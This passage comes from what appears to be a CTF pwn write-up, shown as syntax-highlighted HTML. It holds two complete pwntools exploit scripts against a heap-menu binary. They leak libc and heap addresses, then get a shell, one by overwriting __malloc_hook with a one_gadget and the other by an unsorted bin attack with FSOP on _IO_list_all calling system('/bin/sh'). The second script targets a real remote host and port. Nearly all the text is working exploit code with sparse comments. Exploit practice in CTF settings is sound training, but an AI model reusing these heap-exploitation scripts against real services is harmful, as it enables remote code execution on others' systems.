punctuation">(</span>numb<span class="token punctuation">)</span>rl      <span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>ru      <span class="token operator">=</span> <span class="token keyword">lambda</span> delims              <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">)</span>uu32    <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>uu64    <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>    sa<span class="token punctuation">(</span><span class="token string">"name:"</span><span class="token punctuation">,</span>name<span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"size:"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    sa<span class="token punctuation">(</span><span class="token string">"tion:"</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"index:"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"index:"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># ------- leak libc -----------</span>create<span class="token punctuation">(</span><span class="token string">"\x11\n"</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">"\x11\n"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 0</span>create<span class="token punctuation">(</span><span class="token string">"\x11\n"</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 1</span>create<span class="token punctuation">(</span><span class="token string">"\x11\n"</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 2</span>create<span class="token punctuation">(</span><span class="token string">"\x11\n"</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 3</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token string">"\x11\n"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"\x11"</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xb1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 0</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token string">"\x11\n"</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x40</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 1</span>show<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">"Description:"</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__malloc_hook"</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">0x10</span><span class="token operator">-</span><span class="token number">88</span>success<span class="token punctuation">(</span><span class="token string">"libc addr ==>"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token string">"\x11\n"</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 4</span>create<span class="token punctuation">(</span><span class="token string">"\x11\n"</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 5</span>create<span class="token punctuation">(</span><span class="token string">"\x11\n"</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">"\x11\n"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 6</span>create<span class="token punctuation">(</span><span class="token string">"\x11\n"</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 7</span>create<span class="token punctuation">(</span><span class="token string">"\x11\n"</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 8</span>create<span class="token punctuation">(</span><span class="token string">"\x11\n"</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 9</span>delete<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token string">"\x11\n"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"\x11"</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 6</span>delete<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token string">"\x11\n"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x51</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__malloc_hook"</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 0</span>delete<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token string">"\x11\n"</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token string">"a\n"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token string">"\x11\n"</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">0x1b</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__malloc_hook"</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">0x18</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token string">"\x11\n"</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token operator">+</span>one_gadgets<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"realloc"</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">13</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">"name:"</span><span class="token punctuation">,</span><span class="token string">"aaa\n"</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">"size:"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-2-exp-思路二"><a href="#4-2-exp-思路二" class="headerlink" title="4.2 exp(思路二):"></a>4.2 exp(思路二):</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc.so"</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc.so"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"183.60.136.226"</span><span class="token punctuation">,</span><span class="token number">14823</span><span class="token punctuation">)</span>    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc.so"</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc.so"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 0x45216 execve("/bin/sh", rsp+0x30, environ)</span><span class="token comment" spellcheck="true"># constraints:</span><span class="token comment" spellcheck="true">#   rax == NULL</span><span class="token comment" spellcheck="true"># 0x4526a execve("/bin/sh", rsp+0x30, environ)</span><span class="token comment" spellcheck="true"># constraints:</span><span class="token comment" spellcheck="true">#   [rsp+0x30] == NULL</span><span class="token comment" spellcheck="true"># 0xf02a4 execve("/bin/sh", rsp+0x50, environ)</span><span class="token comment" spellcheck="true"># constraints:</span><span class="token comment" spellcheck="true">#   [rsp+0x50] == NULL</span><span class="token comment" spellcheck="true"># 0xf1147 execve("/bin/sh", rsp+0x70, environ)</span><span class="token comment" spellcheck="true"># constraints:</span><span class="token comment" spellcheck="true">#   [rsp+0x70] == NULL</span>one_gadgets <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x45216</span><span class="token punctuation">,</span><span class="token number">0x4526a</span><span class="token punctuation">,</span><span class="token number">0xf02a4</span><span class="token punctuation">,</span><span class="token number">0xf1147</span><span class="token punctuation">]</span>se      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>sa      <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>sl      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>data<span class="token punctuation">)</span>sla     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>sea     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>rc      <span class="token operator">=</span> <span class="token keyword">lambda</span> numb<span class="token operator">=</span><span class="token number">4096</span>          <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token punctuation">)</span>rl      <span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>ru      <span class="token operator">=</span> <span class="token keyword">lambda</span> delims              <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">)</span>uu32    <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>uu64    <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>    sa<span class="token punctuation">(</span><span class="token string">"name:"</span><span class="token punctuation">,</span>name<span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"size:"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    sa<span class="token punctuation">(</span><span class="token string">"tion:"</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"index:"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"index:"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># ------- leak libc -----------</span>create<span class="token punctuation">(</span><span class="token string">"\x11\n"</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">"\x11\n"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 0</span>create<span class="token punctuation">(</span><span class="token string">"\x11\n"</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 1</span>create<span class="token punctuation">(</span><span class="token string">"\x11\n"</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 2</span>create<span class="token punctuation">(</span><span class="token string">"\x11\n"</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 3</span>create<span class="token punctuation">(</span><span class="token string">"\x11\n"</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 4</span>create<span class="token punctuation">(</span><span class="token string">"\x11\n"</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 5</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token string">"\x11\n"</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 1</span>show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">"Description:"</span><span class="token punctuation">)</span>heap_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x20</span>success<span class="token punctuation">(</span><span class="token string">"heap address ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>heap_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token string">"\x11\n"</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 2</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token string">"\x11\n"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"\x11"</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x91</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 0</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token string">"\x11\n"</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x40</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 1</span>show<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">"Description:"</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__malloc_hook"</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">0x10</span><span class="token operator">-</span><span class="token number">88</span>success<span class="token punctuation">(</span><span class="token string">"libc addr ==>"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># ----------- FSOP Attack and unsorted bin attack----------------</span>create<span class="token punctuation">(</span><span class="token string">"\x11\n"</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token string">"shinnosuke\n"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 6</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token string">"\x11\n"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xc1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 0</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x10</span>payload<span class="token operator">+=</span> <span class="token string">"/bin/sh;"</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x61</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"_IO_list_all"</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># unsorted bin attack，顺便修改下size为0x61</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># wtite_ptr > write_base</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">7</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span>heap_addr<span class="token operator">+</span><span class="token number">0x100</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">13</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span>heap_addr<span class="token operator">+</span><span class="token number">0x100</span><span class="token operator">-</span><span class="token number">0x50</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span><span class="token string">"\n"</span>create<span class="token punctuation">(</span><span class="token string">"\x11\n"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 0</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">"Input your choice:"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">"name:"</span><span class="token punctuation">,</span><span class="token string">'\n'</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">"Description size:"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 最后遍历的时候就完成了unsorted bin attack攻击和创造0x60大小的smallbin chunk</span><span class="token comment" spellcheck="true"># gdb.attach(p)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" 